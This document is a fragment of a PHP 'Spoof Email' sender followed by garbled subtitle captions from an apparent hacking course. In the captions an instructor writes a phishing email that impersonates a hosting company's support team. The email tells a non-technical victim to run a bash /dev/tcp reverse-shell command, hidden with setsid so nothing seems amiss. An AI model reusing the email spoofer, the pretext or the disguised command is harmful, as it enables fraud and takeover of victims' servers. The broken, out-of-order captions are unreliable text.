	if (!(filter_var($to, FILTER_VALIDATE_EMAIL) && filter_var($from, FILTER_VALIDATE_EMAIL))) {
		echo "Email address inputs invalid";
		 die();
	} 

	$header = "From: " .  $name . " <" . $from . ">\r\nMIME-Version: 1.0\r\nContent-type: text/html\r\n";

	$retval = mail ($to, $subject, $message, $header);

	if ($retval) {
		echo "Email sent.";
	} else {
		echo "Email did not send. Error: " . $retval;
	}
} else {
	echo 
	'<html>
		<head>
			<style> 
				input[type=submit] {
				  background-color: #4CAF50;
				  border: none;
				  color: white;
				  padding: 14px 32px;
				  text-decoration: none;
				  margin: 4px 2px;
				  cursor: pointer;
				  font-size: 16px;
				}
			</style>
		</head>
		<body>

			<h2>Spoof Email</h2>

			<form action="/send.php" method="post" id="emailform">
			  <label for="to">To:</label><br>
			  <input type="text" id="to" name="to"><br><br>
			  <label for="from">From:</label><br>
			  <input type="text" id="from" name="from"><br><br>
			  <label for="name">Name (optional):</label><br>
			  <input type="text" id="name" name="name"><br><br>
			  <label for="subject">Subject:</label><br>
			  <input type="text" id="subject" name="subject"><br><br>
			  <label for="message">Message [HTML is supported]:</label><br>
			  <textarea rows="6" cols="50" name="message" form="emailform"></textarea><br><br>
			  <input type="hidden" id="send" name="send" value="true">
			  <input type="submit" value="Submit">
			</form> 

			<p>An e-mail will be sent to the desired target with a spoofed From header when you click Submit.</p>

		</body>
	</html>' ;
}


?>

3

00:00:11,640  -->  00:00:15,220

4

and once they open that, will execute the Keylogger or will hack into their computer.

5

00:00:20,120  -->  00:00:25,480

6

7

00:00:31,120  -->  00:00:33,720
Today, I want to show you a different scenario.

8

00:00:34,100  -->  00:00:38,880
Let's say that you couldn't really know what the target person is interested in

9

00:00:39,120  -->  00:00:43,400
or you think that the target will never execute something that you sent them,

10

00:00:43,400  -->  00:00:49,380
even though if the thing that you're sending looks like an image or a PDF, you still think that they won't open it.

11

00:00:50,100  -->  00:00:54,071
And let's say that you are-- they use a Linux computer

12

00:00:54,220  -->  00:00:57,160
or your target  is a server that they use.

13

00:00:57,340  -->  00:01:02,900
So, your target is their website or their server that they control on their company.

14

00:01:03,360  -->  00:01:09,400
If that's the case, you can pretend to be the hosting company that they use

15

00:01:09,740  -->  00:01:12,320
and send them a message from the Support

16

00:01:12,500  -->  00:01:16,000
and pretend and tell them that there is something wrong with the server

17

00:01:16,120  -->  00:01:17,920
and please execute this command.

18

00:01:18,360  -->  00:01:23,800
The command that you give them, will give you a reverse shell on that computer, on that server.

19

00:01:24,440  -->  00:01:29,100
Now obviously, you want to send this to a person that is not very technical,

20

00:01:29,140  -->  00:01:32,120
so that they won't understand what this command is gonna do.

21

00:01:33,080  -->  00:01:38,020
You might think this will not happen in real life but trust me it happens a lot.

22

00:01:38,440  -->  00:01:43,220
And most of the major and big websites and companies get hacked using these ways,

23

00:01:43,220  -->  00:01:47,320
by leveraging people that are not-- that don't know much about security.

24

00:01:49,320  -->  00:01:54,580

upport people.

00:03:40,840  -->  00:03:42,420
So, I'm just going to send that to Zaid.

47

00:03:45,440  -->  00:03:50,100
Now, you want to pick a subject that will make the target person open the message

48

00:03:50,480  -->  00:03:52,240
and do what you're asking them to do.

49

00:03:53,360  -->  00:03:55,840
So, let's call it Major Security Threat.

50

00:03:57,460  -->  00:03:58,660
Then in the body...

51

00:03:59,260  -->  00:04:04,940
because I'm pretending to be the Support of that website, of the website that they u-- that they used,

52

00:04:05,160  -->  00:04:06,600
to host their website.

53

00:04:07,020  -->  00:04:11,180
So, I am the technical person. I'm pretending to be the technical person.

54

00:04:11,280  -->  00:04:13,422
And what I'm gonna say is, I'm gonna tell them

55

00:04:13,422  -->  00:04:16,820
that "We're sorry, there is something that's misconfigured on your server.

56

00:04:17,260  -->  00:04:22,580
Please login to your server and execute the following command on it, to fix that issue."

57

00:04:23,980  -->  00:04:27,000
So let's write our message. We're gonna say, "Dear Zaid,

58

00:04:28,520  -->  00:04:32,500
We noticed that you misconfigured your TCP settings.

59

00:04:32,680  -->  00:04:38,940
This can be a major security threat as it can allow other people to connect to your web server."

60

00:04:40,000  -->  00:04:43,640
Okay. Now, we're gonna, we're gonna offer them a solution to fix this issue.

61

00:04:43,820  -->  00:04:48,620
So we're gonna tell them, "Please log into your web server and execute the following command."

62

00:04:50,040  -->  00:04:53,020
Then we're going to put the one line command that we've seen before,

63

00:04:53,340  -->  00:04:55,060
that will give us a reverse connection

64

00:04:55,320  -->  00:05:01,480
and that command was 'bash -i &gt;&amp;/dev/tcp/' my IP

65

00:05:02,140  -->  00:05:04,680
followed by the port that I want to receive the connection on.

66

00:05:05,900  -->  00:05:09,540
Now, we covered this command before and we explained how it works.

67

00:05:10,060  -->  00:05:13,420
Usually when you run this command, it give us a reverse connection

68

00:05:13,420  -->  00:05:16,220
to the Kali machine, to the IP that we specify here.

69

00:05:16,720  -->  00:05:21,420
But if you remember, the cursor will not show a new line to enter a new command.

70

00:05:21,580  -->  00:05:24,920
So, to look as if the terminal is still doing something.

71

00:05:25,780  -->  00:05:31,320
Now to get this to be executed in the background, we're just gonna put 'setsid'.

72

00:05:32,480  -->  00:05:35,640
This will basically exe-- execute this command in the background

73

00:05:35,720  -->  00:05:39,620
and it will just show the target person a new terminal entry line,

74

00:05:39,680  -->  00:05:44,540
so that they won't feel suspicious or think that something is actually happening in the background.

75

00:05:46,000  -->  00:05:46,820
Now we're done.

76

00:05:46,840  -->  00:05:52,640
I'm just gonna say, "Regards Leaseweb support team."

77

00:05:54,720  -->  00:05:58,820
Now let's style this a bit, to make it look a little bit more acceptable.

78

00:05:59,060  -->  00:06:01,140
